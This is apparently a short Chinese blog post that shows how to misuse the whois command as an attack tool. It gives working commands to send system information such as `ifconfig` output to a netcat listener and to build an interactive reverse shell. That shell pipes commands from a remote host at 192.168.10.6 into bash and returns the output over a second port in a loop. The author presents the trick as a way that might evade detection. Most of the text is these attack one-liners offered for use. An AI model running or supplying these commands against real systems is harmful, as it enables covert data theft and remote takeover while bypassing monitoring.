WHOIS


whois命令通常是用来查询网站信息的

但它还有个功能是连接一个服务器，并传输一段信息

whois -h [IP] -p [端口] [内容]

适用于小文件隐蔽传输，最小化发现


传输信息


可以在内网中传输信息

接收端

nc -lvp 4444

发送端

whois -h 127.0.0.1 -p 4444 `ifconfig`


反弹shell


网上有whois反弹shell姿势，但只局限于上面的信息传输

怎样实现交互式执行命令呢？


whois连接上nc后是可以接收nc传输回来的内容滴

既然这样，就能将whois接受的命令传递给bash执行

whois -h 192.168.10.6 -p 4444 test | bash

但是执行命令必须将nc连接断开，命令才输出给bash

当然，这样是没法收到命令回显的

所以嵌套一层试试，将命令回显当内容传送给另一个6666端口

whois -h 192.168.10.6 -p 6666 `whois -h 192.168.10.6 -p 4444 text | bash`

这时开两个监听端口，4444就是输入命令,6666就是接收回显

nc -lvp 4444 nc -lvp 6666

上面命令是可以实现单次反弹shell，这样我们加一个while循环

while whois -h 192.168.10.6 -p 6666 `whois -h 192.168.10.6 -p 4444 123 | bash`;do echo test;done;

用法

nc -lvp 4444 -> 4444端口输入命令 -> ctrl+c -> nc -lvp 4444nc -lvp 6666 -> 6666端口查收命令 -> ctrl+c -> nc -lvp 6666

经过测试发现使用很不理想，执行命令必须有返回值

命令没回显会报错cd ../，那就添加个输出

while whois -h 192.168.10.6 -p 6666 `echo "output";whois -h 192.168.10.6 -p 4444 echo | bash`;do :;done;

缺点就是不维持bash状态，利用比较麻烦，但姿势比较猥琐，有几率会绕过检测（但我没测试）
